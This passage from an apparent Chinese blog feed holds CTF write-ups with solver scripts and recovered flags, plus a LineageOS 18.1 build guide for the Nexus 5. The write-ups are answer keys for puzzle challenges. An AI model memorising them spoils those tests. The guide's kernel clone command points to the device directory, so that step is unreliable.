class="number">0x8D</span>,<span class="number">0xD5</span>,<span class="number">0x4E</span>,<span class="number">0xA9</span>,<span class="number">0x6C</span>,<span class="number">0x56</span>,<span class="number">0xF4</span>,<span class="number">0xEA</span>,<span class="number">0x65</span>,<span class="number">0x7A</span>,<span class="number">0xAE</span>,<span class="number">0x08</span>,<span class="number">0xBA</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2E</span>,<span class="number">0x1C</span>,<span class="number">0xA6</span>,<span class="number">0xB4</span>,<span class="number">0xC6</span>,<span class="number">0xE8</span>,<span class="number">0xDD</span>,<span class="number">0x74</span>,<span class="number">0x1F</span>,<span class="number">0x4B</span>,<span class="number">0xBD</span>,<span class="number">0x8B</span>,<span class="number">0x8A</span>,<span class="number">0x70</span>,<span class="number">0x3E</span>,<span class="number">0xB5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xF6</span>,<span class="number">0x0E</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xB9</span>,<span class="number">0x86</span>,<span class="number">0xC1</span>,<span class="number">0x1D</span>,<span class="number">0x9E</span>,<span class="number">0xE1</span>,<span class="number">0xF8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xD9</span>,<span class="number">0x8E</span>,<span class="number">0x94</span>,<span class="number">0x9B</span>,<span class="number">0x1E</span>,<span class="number">0x87</span>,<span class="number">0xE9</span>,<span class="number">0xCE</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xDF</span>,<span class="number">0x8C</span>,<span class="number">0xA1</span>,<span class="number">0x89</span>,<span class="number">0x0D</span>,<span class="number">0xBF</span>,<span class="number">0xE6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2D</span>,<span class="number">0x0F</span>,<span class="number">0xB0</span>,<span class="number">0x54</span>,<span class="number">0xBB</span>,<span class="number">0x16</span>,<span class="number">0x48</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> v5; <span class="comment">// al</span></span><br><span class="line">	<span class="keyword">int</span> v6; <span class="comment">// esi</span></span><br><span class="line">	<span class="keyword">int</span> v7; <span class="comment">// edi</span></span><br><span class="line">	<span class="keyword">char</span> v8; <span class="comment">// al</span></span><br><span class="line">	<span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">	<span class="keyword">char</span> v10; <span class="comment">// cl</span></span><br><span class="line">	<span class="keyword">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">	<span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++) &#123;</span><br><span class="line">			v5 = j;</span><br><span class="line">			v6 = (v5 &gt;&gt; <span class="number">4</span>) % <span class="number">16</span>;</span><br><span class="line">			v7 = (<span class="number">16</span> * v5 &gt;&gt; <span class="number">4</span>) % <span class="number">16</span>;</span><br><span class="line">			v8 = byte_402150[<span class="number">2</span> * i];</span><br><span class="line">			<span class="keyword">if</span> (v8 &lt; <span class="string">&#x27;0&#x27;</span> || v8 &gt; <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">				v9 = v8 - <span class="number">87</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				v9 = v8 - <span class="number">48</span>;</span><br><span class="line">			v10 = byte_402150[<span class="number">2</span> * i + <span class="number">1</span>];</span><br><span class="line">			v11 = <span class="number">16</span> * v9;</span><br><span class="line">			<span class="keyword">if</span> (v10 &lt; <span class="string">&#x27;0&#x27;</span> || v10 &gt; <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">				v12 = v10 - <span class="number">87</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				v12 = v10 - <span class="number">48</span>;</span><br><span class="line">			<span class="keyword">if</span> (byte_4021A0[<span class="number">16</span> * v6 + v7] != ((v11 + v12) ^ <span class="number">0x19</span>))</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			cout &lt;&lt; (<span class="keyword">char</span>)j;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而dalao都是直接看破算法的本质 Orz</p>
<blockquote>
<p>要求table[input[i]] == atoi(data[2<em>i]+data[2</em>i+1])^0x19<br><a href="https://www.anquanke.com/post/id/164604#h2-5">https://www.anquanke.com/post/id/164604#h2-5</a></p>
</blockquote>
<h2 id="Reverse-HighwayHash64（湖湘杯）"><a href="#Reverse-HighwayHash64（湖湘杯）" class="headerlink" title="Reverse - HighwayHash64（湖湘杯）"></a>Reverse - HighwayHash64（湖湘杯）</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这种题一般都会修改默认的加密参数，所以编译时需要修改默认的c语言文件<br>基本上参考<a href="https://impakho.com/post/hxb-2018-writeup">dalao的方法</a>，编译修改过的模块，用python爆破</p>
<blockquote>
<p>第一个判断，用来验证 flag 的长度，经过爆破，确定 flag 的长度为 19(也可动态调试获得0x13)<br>第二个判断，用来验证 flag 格式内的值，也可以爆破，来确定 flag 格式内的值</p>
</blockquote>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> highwayhash <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;\0&quot;</span> * <span class="number">32</span></span><br><span class="line">data = <span class="string">b&quot;\0&quot;</span> * <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reserveHex</span>(<span class="params">text</span>):</span></span><br><span class="line">    ret = <span class="string">&quot;&quot;</span></span><br><span class="line">    lens = <span class="built_in">len</span>(text)</span><br><span class="line">    times = <span class="built_in">int</span>(lens/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        ret+=text[lens-<span class="number">2</span>*i-<span class="number">2</span>:lens-<span class="number">2</span>*i]</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">res = <span class="built_in">bytes</span>.fromhex(reserveHex(<span class="string">&quot;D31580A28DD8E6C4&quot;</span>))</span><br><span class="line"></span><br><span class="line">i=<span class="number">20</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i-=<span class="number">1</span></span><br><span class="line">    data=<span class="built_in">str</span>(i)</span><br><span class="line">    data=data.rjust(<span class="number">2</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    data=<span class="built_in">bytes</span>.fromhex(data+<span class="string">&quot;000000&quot;</span>)</span><br><span class="line">    op=highwayhash_64(key, data)</span><br><span class="line">    <span class="keyword">if</span> op == res:</span><br><span class="line">        <span class="built_in">print</span> (i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">i=<span class="number">1532649709</span></span><br><span class="line"><span class="comment">#因为已经爆破出来是1532649708，所以就直接写了</span></span><br><span class="line">res = <span class="built_in">bytes</span>.fromhex(reserveHex(<span class="string">&quot;E3BE26AF8730545A&quot;</span>))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i-=<span class="number">1</span></span><br><span class="line">    data=<span class="built_in">str</span>(i)</span><br><span class="line">    data=data.rjust(<span class="number">10</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    data=<span class="built_in">bytes</span>(data,<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    op=highwayhash_64(key, data)</span><br><span class="line">    <span class="keyword">if</span> op == res:</span><br><span class="line">        <span class="built_in">print</span> (i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;.&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="趣味密码"><a href="#趣味密码" class="headerlink" title="趣味密码"></a>趣味密码</h2><blockquote>
<p>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;– -&lt;]&gt;- -.+++ +++.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; ++++[ -&gt;— -&lt;]&gt;- -.+++ ++.++ ++++. &lt;+++[ -&gt;— &lt;]&gt;– —-. &lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;+ ++[-&gt; —&lt;] &gt;—- .&lt;+++ [-&gt;++ +&lt;]&gt;+ ++++. +.&lt;++ +[-&gt;- –&lt;]&gt; –.++ +++.- —– -.&lt;++ ++++[ -&gt;— —&lt;] &gt;.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;++++ +++++ ++.++ +++++ .—- —– .++++ .—- -.&lt;++ +[-&gt;+ ++&lt;]&gt; +++++ .&lt;</p>
</blockquote>
<p>一段bf代码，<a href="http://copy.sh/brainfuck/">在线解密</a>得到flag</p>
<blockquote>
<p>flag{interestingCrypto}</p>
</blockquote>
<h2 id="你玩英雄联盟吗"><a href="#你玩英雄联盟吗" class="headerlink" title="你玩英雄联盟吗"></a>你玩英雄联盟吗</h2><p>是一个流量包，wireshark打开，搜索flag，发现post了一个压缩包<br>导出发现有密码，但是可以明文攻击<br>解压出来的flag.zip是伪加密，修复后解压出一个反色的二维码<br>反色后<a href="https://zxing.org/w/decode.jspx">在线解析</a>得到flag<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf2_lol.png"></p>
<h2 id="紫霞仙子"><a href="#紫霞仙子" class="headerlink" title="紫霞仙子"></a>紫霞仙子</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>jpg文件后隐藏有一个zip文件，提取出来后发现是伪加密，解压出一个包含rgb值的txt文件，有74884行<br>在<a href="https://zh.numberempire.com/">数字帝国</a>查询，得到分解因式的结果<br><code>2x2x7x193</code></p>
<p>猜测高度宽度为386，194<br>于是用搜索引擎查找rgb值转图片，得到<a href="https://blog.csdn.net/ssjjtt1997/article/details/78450816">一个转换脚本</a><br>手动删除txt文件的括号后使用脚本转换</p>
<h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">386</span>    <span class="comment">#x坐标  通过对txt里的行数进行整数分解</span></span><br><span class="line">y = <span class="number">194</span>    <span class="comment">#y坐标  x * y = 行数</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>, (x, y))   <span class="comment">#创建图片</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;rgb.txt&#x27;</span>)    <span class="comment">#打开rbg值的文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过每个rgb点生成图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y):</span><br><span class="line">        line = file.readline()  <span class="comment">#获取一行的rgb值</span></span><br><span class="line">        rgb = line.split(<span class="string">&quot;,&quot;</span>)  <span class="comment">#分离rgb，文本中逗号后面有空格</span></span><br><span class="line">        im.putpixel((i, j), (<span class="built_in">int</span>(rgb[<span class="number">0</span>]), <span class="built_in">int</span>(rgb[<span class="number">1</span>]), <span class="built_in">int</span>(rgb[<span class="number">2</span>])))    <span class="comment">#将rgb转化为像素</span></span><br><span class="line"><span class="comment">#im.save(&#x27;flag.jpg&#x27;)</span></span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure>
<p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf2_jpg.jpg"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>编译 Lineage 18.1 (Android 11.0) for Nexus 5</title>
    <url>/2021/10/06/lineage-compile-for-nexus5/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>AOSP官方源码，对<code>Nexus 5</code>仅支持到<code>Android 6.0</code>，而第三方系统支持<code>Android 11.0</code>。</p>
<p>由于需要定制系统和内核，故考虑克隆源码，手动编译。</p>
<h2 id="ROM下载地址"><a href="#ROM下载地址" class="headerlink" title="ROM下载地址"></a>ROM下载地址</h2><p><a href="https://forum.xda-developers.com/t/rom-unofficial-lineageos-18-1-for-nexus-5-hammerhead-discontinued.4214367/">[ROM][UNOFFICIAL] LineageOS 18.1 for Nexus 5 (hammerhead) [DISCONTINUED] | XDA Forums</a></p>
<span id="more"></span>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="Repo"><a href="#Repo" class="headerlink" title="Repo"></a>Repo</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo -o repo</span><br><span class="line">chmod +x repo</span><br><span class="line">sudo mv repo /usr/local/bin/</span><br><span class="line">export REPO_URL=&#x27;https://mirrors.tuna.tsinghua.edu.cn/git/git-repo&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir lineage</span><br><span class="line">cd lineage</span><br><span class="line">repo init -u https://mirrors.tuna.tsinghua.edu.cn/git/lineageOS/LineageOS/android.git -b lineage-18.1</span><br></pre></td></tr></table></figure>
<h3 id="修改xml以使用TUNA镜像"><a href="#修改xml以使用TUNA镜像" class="headerlink" title="修改xml以使用TUNA镜像"></a>修改xml以使用TUNA镜像</h3><p>打开<code>.repo/manifests/default.xml</code>，具体修改见<a href="https://mirrors.tuna.tsinghua.edu.cn/help/lineageOS/">lineageOS 源代码镜像使用帮助</a></p>
<h3 id="同步源码"><a href="#同步源码" class="headerlink" title="同步源码"></a>同步源码</h3><p>使用<code>repo</code>同步<code>lineage-18.1</code>源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">repo sync -c -j4 --force-sync</span><br></pre></td></tr></table></figure>

<h3 id="Patches"><a href="#Patches" class="headerlink" title="Patches"></a>Patches</h3><p>设置环境变量<code>$LINEAGE_DIR</code>为源码目录后，执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export LINEAGE_DIR=/media/xhy/a5d37cc9-d3a3-43c8-909d-178d70a6598c/Android/source/lineage</span><br><span class="line"></span><br><span class="line">echo &quot;Patch SurfaceFlinger&quot;</span><br><span class="line">cd $LINEAGE_DIR/frameworks/native</span><br><span class="line">git fetch &quot;https://github.com/LineageOS/android_frameworks_native&quot; refs/changes/15/310715/1 &amp;&amp; git cherry-pick FETCH_HEAD</span><br><span class="line">cd $LINEAGE_DIR/vendor/lineage</span><br><span class="line">git fetch &quot;https://github.com/LineageOS/android_vendor_lineage&quot; refs/changes/16/310716/1 &amp;&amp; git cherry-pick FETCH_HEAD</span><br><span class="line"></span><br><span class="line">echo &quot;Patch QCOM display&quot;</span><br><span class="line">cd $LINEAGE_DIR/hardware/qcom/display</span><br><span class="line">git fetch https://github.com/z3DD3r/android_hardware_qcom_display lineage-18.1 &amp;&amp; git cherry-pick 6efcc49e6a81fdc1e248f5002633f8cad6e6395b^..064cec4d219aa3e4c26f0a281d93f064b9372832</span><br><span class="line"></span><br><span class="line">echo &quot;Patch Vold (USB OTG)&quot;</span><br><span class="line">cd $LINEAGE_DIR/system/vold</span><br><span class="line">git fetch https://github.com/z3DD3r/android_system_vold lineage-18.1 &amp;&amp; git cherry-pick eca4855b992868e05f3be34ea9f7c41b565b4e1a^..f5730f872ed7e58a064529346d3e371b9cd4d73f</span><br><span class="line"></span><br><span class="line">echo &quot;Patch AOSP Keyboard&quot;</span><br><span class="line">cd $LINEAGE_DIR/packages/inputmethods/LatinIME</span><br><span class="line">git fetch https://github.com/z3DD3r/android_packages_inputmethods_LatinIME lineage-18.1 &amp;&amp; git cherry-pick 7e55f8c6b7257af03891934da329e2f6aea72c67^..6b0819b6373ee18766d8b1846dcf512dd527dc13</span><br><span class="line"></span><br><span class="line">echo &quot;Back to LINEAGE_DIR&quot;</span><br><span class="line">cd $LINEAGE_DIR</span><br></pre></td></tr></table></figure>
<h3 id="下载设备相关文件"><a href="#下载设备相关文件" class="headerlink" title="下载设备相关文件"></a>下载设备相关文件</h3><h4 id="使用Local-Manifests（推荐）"><a href="#使用Local-Manifests（推荐）" class="headerlink" title="使用Local Manifests（推荐）"></a>使用Local Manifests（推荐）</h4><p>创建<code>.repo/local_manifests/hammerhead.xml</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;manifest&gt;</span><br><span class="line">  &lt;project name=&quot;z3DD3r/android_device_lge_hammerhead&quot; path=&quot;device/lge/hammerhead&quot; remote=&quot;github&quot; /&gt;</span><br><span class="line">  &lt;project name=&quot;z3DD3r/android_kernel_lge_hammerhead&quot; path=&quot;kernel/lge/hammerhead&quot; remote=&quot;github&quot; /&gt;</span><br><span class="line">  &lt;project name=&quot;z3DD3r/android_vendor_lge&quot; path=&quot;vendor/lge&quot; remote=&quot;github&quot; /&gt;</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure>
<p>然后<code>repo sync -c -j4 --force-sync</code>即可</p>
<p>PS：<code>proprietary</code>文件已在<code>android_vendor_lge</code>中，不需要手动导出</p>
<h4 id="手动克隆"><a href="#手动克隆" class="headerlink" title="手动克隆"></a>手动克隆</h4><h5 id="device"><a href="#device" class="headerlink" title="device"></a>device</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir device/lge</span><br><span class="line">git clone https://github.com/z3DD3r/android_device_lge_hammerhead -b lineage-18.1 device/lge/hammerhead</span><br></pre></td></tr></table></figure>
<h5 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir kernel/lge</span><br><span class="line">git clone https://github.com/z3DD3r/android_kernel_lge_hammerhead -b lineage-18.1 device/lge/hammerhead</span><br></pre></td></tr></table></figure>
<h5 id="vendor"><a href="#vendor" class="headerlink" title="vendor"></a>vendor</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/z3DD3r/android_vendor_lge -b lineage-18.1 vendor/lge</span><br></pre></td></tr></table></figure>

<h2 id="编译环境选择"><a href="#编译环境选择" class="headerlink" title="编译环境选择"></a>编译环境选择</h2><h3 id="使用Docker容器（推荐）"><a href="#使用Docker容器（推荐）" class="headerlink" title="使用Docker容器（推荐）"></a>使用Docker容器（推荐）</h3><p>使用已安装好依赖的镜像，不需要自己配置编译环境</p>
<h4 id="使用docker-lineage-v18-1（推荐）"><a href="#使用docker-lineage-v18-1（推荐）" class="headerlink" title="使用docker-lineage:v18.1（推荐）"></a>使用docker-lineage:v18.1（推荐）</h4><p>设置<code>ANDROID_VOL</code>为源码父目录后，创建容器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export ANDROID_VOL=/media/xhy/a5d37cc9-d3a3-43c8-909d-178d70a6598c/Android</span><br><span class="line">docker run --privileged -it \</span><br><span class="line">-v &quot;$ANDROID_VOL/source:/srv/src&quot; \</span><br><span class="line">-v &quot;$ANDROID_VOL/ccache:/srv/ccache&quot; \</span><br><span class="line">xhyeax/docker-lineage:v18.1</span><br></pre></td></tr></table></figure>
<h4 id="使用docker-lineage-cicd"><a href="#使用docker-lineage-cicd" class="headerlink" title="使用docker-lineage-cicd"></a>使用docker-lineage-cicd</h4><p><a href="https://github.com.cnpmjs.org/lineageos4microg/docker-lineage-cicd">docker-lineage-cicd</a><br>设置<code>ANDROID_VOL</code>为源码父目录后，创建容器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export ANDROID_VOL=/media/xhy/a5d37cc9-d3a3-43c8-909d-178d70a6598c/Android</span><br><span class="line">docker run --privileged -it \</span><br><span class="line">-e &quot;BRANCH_NAME=lineage-18.1&quot; \</span><br><span class="line">-e &quot;DEVICE_LIST=hammerhead&quot; \</span><br><span class="line">-e &quot;INCLUDE_PROPRIETARY=false&quot; \</span><br><span class="line">-e &quot;CRONTAB_TIME=notnow&quot; \</span><br><span class="line">-v &quot;$ANDROID_VOL/source:/srv/src&quot; \</span><br><span class="line">-v &quot;$ANDROID_VOL/zips:/srv/zips&quot; \</span><br><span class="line">-v &quot;$ANDROID_VOL/logs:/srv/logs&quot; \</span><br><span class="line">-v &quot;$ANDROID_VOL/ccache:/srv/ccache&quot; \</span><br><span class="line">lineageos4microg/docker-lineage-cicd</span><br></pre></td></tr></table></figure>
<p>使用错误的定时任务格式，阻止脚本自动编译，输出如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lineageos4microg/docker-lineage-cicd</span><br><span class="line">Set cache size limit to 50.0 GB</span><br><span class="line">&quot;/tmp/buildcron&quot;:45: bad minute</span><br><span class="line">errors in crontab file, can&#x27;t install.</span><br></pre></td></tr></table></figure>
<p>此时使用<code>VSCode</code>的<code>Docker</code>插件，附加容器即可（也可按下<code>Ctrl+C</code>退出后，重启容器后附加）</p>
<p>PS:还可以将<code>CRONTAB_TIME</code>设置为<code>0 0 0 1 1</code>（每年的1月一日），再删除定时任务</p>
<h3 id="本地编译"><a href="#本地编译" class="headerlink" title="本地编译"></a>本地编译</h3><p><a href="https://wiki.lineageos.org/devices/hammerhead/build">Build for hammerhead | LineageOS Wiki</a></p>
<h4 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install -y bc bison bsdmainutils build-essential ccache cgpt clang \</span><br><span class="line">    curl flex g++-multilib gcc-multilib git gnupg gperf imagemagick \</span><br><span class="line">    kmod lib32ncurses5-dev lib32readline-dev lib32z1-dev liblz4-tool \</span><br><span class="line">    libncurses5 libncurses5-dev libsdl1.2-dev libssl-dev libxml2 \</span><br><span class="line">    libxml2-utils lsof lzop maven openjdk-8-jdk pngcrush procps \</span><br><span class="line">    python rsync schedtool squashfs-tools wget xdelta3 xsltproc yasm zip \</span><br><span class="line">    zlib1g-dev</span><br></pre></td></tr></table></figure>
<h4 id="配置ccache"><a href="#配置ccache" class="headerlink" title="配置ccache"></a>配置ccache</h4><p>启用<code>ccache</code>并设置路径和大小：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export USE_CCACHE=1</span><br><span class="line">export CCACHE_DIR=/media/xhy/a5d37cc9-d3a3-43c8-909d-178d70a6598c/Android/ccache</span><br><span class="line">ccache -M 50G</span><br></pre></td></tr></table></figure>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><h2 id="开始编译"><a href="#开始编译" class="headerlink" title="开始编译"></a>开始编译</h2><p>打开系统源码目录，执行以下命令编译：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source build/envsetup.sh</span><br><span class="line">brunch hammerhead</span><br></pre></td></tr></table></figure>

<h2 id="碰到的问题"><a href="#碰到的问题" class="headerlink" title="碰到的问题"></a>碰到的问题</h2><h3 id="LOCAL-COPY-HEADERS-is-obsolete"><a href="#LOCAL-COPY-HEADERS-is-obsolete" class="headerlink" title="LOCAL_COPY_HEADERS is obsolete"></a>LOCAL_COPY_HEADERS is obsolete</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hardware/qcom/display/msm8974/libgralloc/Android.mk: error: gralloc.msm8974: LOCAL_COPY_HEADERS is obsolete</span><br></pre></td></tr></table></figure>
<p>原因：<code>hardware/qcom/display</code>未<code>Patch</code><br>解决方案：执行前文<code>Patch</code>部分的<code>Patch QCOM display</code></p>
<h3 id="No-rule-to-make-target-“-hz-h”-needed-by-‘kernel-hz-bc’"><a href="#No-rule-to-make-target-“-hz-h”-needed-by-‘kernel-hz-bc’" class="headerlink" title="No rule to make target  “/hz.h”, needed by ‘kernel/hz.bc’"></a>No rule to make target  “/hz.h”, needed by ‘kernel/hz.bc’</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">No rule to make target &#x27;lineage/out/target/product/hammerhead/obj/KERNEL_OBJ/include/config/hz.h&#x27;, needed by &#x27;kernel/hz.bc&#x27;</span><br></pre></td></tr></table></figure>
<p>原因：可能是文件缺失<br>解决方案：<code>repo sync -c -j4 --force-sync</code>，重新同步源码，从头再来</p>
<h2 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h2><h3 id="刷入TWRP"><a href="#刷入TWRP" class="headerlink" title="刷入TWRP"></a>刷入TWRP</h3><p>前往<a href="https://sourceforge.net/projects/hammerhead-twrp/files/beta/">hammerhead-twrp</a>下载最新的<code>TWRP</code>镜像，并刷入设备</p>
<h3 id="清除数据"><a href="#清除数据" class="headerlink" title="清除数据"></a>清除数据</h3><p>如果之前的系统不是<code>LineageOS 18.1</code>，建议清除数据后刷入，具体操作：<br>进入<code>TWRP</code>，选择<code>Wipe</code>-<code>Advanced Wipe</code>，清除<code>System</code>、<code>Data</code>、<code>Cache</code>分区数据</p>
<h3 id="刷入系统"><a href="#刷入系统" class="headerlink" title="刷入系统"></a>刷入系统</h3><p>将生成的刷机包发送到手机后，使用<code>TWRP</code>刷入即可</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/luoyesiqiu/p/10701419.html">自己动手编译Android(LineageOS)源码 </a><br><a href="https://github.com/huataihuang/cloud-atlas-draft/blob/master/develop/android/lineageos/build_lineageos_for_hammerhead.md">huataihuang/cloud-atlas-draft build_lineageos_for_hammerhead</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>isc2019 Reverse&amp;Misc&amp;Crypto&amp;Android Writeup</title>
    <url>/2019/05/28/isc-2019-wp/</url>
    <content><![CDATA[<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Very-easy"><a href="#Very-easy" class="headerlink" title="Very easy"></a>Very easy</h3><p>得到一个<code>pyc</code>文件，在线反编译得到python源码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">import</span> base64</span><br><span class="line">correct = <span class="string">&#x27;VlxRV2uAiXOPeSWPhiOCaY91JGOJj4Qgj4JVhlVigyNt&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">message</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = <span class="built_in">ord</span>(i) ^ <span class="number">32</span></span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">ord</span>(i)</span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">decode()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Input flag:&#x27;</span></span><br><span class="line">flag = raw_input()</span><br><span class="line"><span class="keyword">if</span> encode(flag) == correct:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;correct&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;wrong&#x27;</span></span><br></pre></td></tr></table></figure>

<p>逻辑是将输入的字符串逐位与32异或，再加十六，转回ascii码。</p>
<span id="more"></span>
<h2 id="解密函数"><a href="#解密函数" class="headerlink" title="解密函数"></a>解密函数</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">correct = <span class="string">&#x27;VlxRV2uAiXOPeSWPhiOCaY91JGOJj4Qgj4JVhlVigyNt&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    message = base64.b64decode(correct)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = (<span class="built_in">ord</span>(i)-<span class="number">16</span>)^<span class="number">32</span></span><br><span class="line">        s+= <span class="built_in">chr</span>(x)</span><br><span class="line">    <span class="built_in">print</span> s</span><br></pre></td></tr></table></figure>
<p>调用解得flag<br><code>flag&#123;PYC_I5_V3Ry_E4sY_T0_ReVerS3&#125;</code></p>
